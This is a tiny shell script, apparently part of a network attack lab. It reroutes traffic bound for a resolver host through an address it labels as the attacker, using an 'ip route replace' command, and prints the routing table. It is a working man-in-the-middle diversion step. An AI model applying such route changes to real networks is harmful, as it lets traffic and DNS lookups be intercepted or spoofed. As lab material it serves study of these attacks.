#!/bin/sh
set -eu
echo "[CORE-ROUTER] Installing diversion route for resolver traffic via attacker 172.16.2.100..."
ip route replace 172.16.2.10 via 172.16.2.100 dev eth1
ip route show
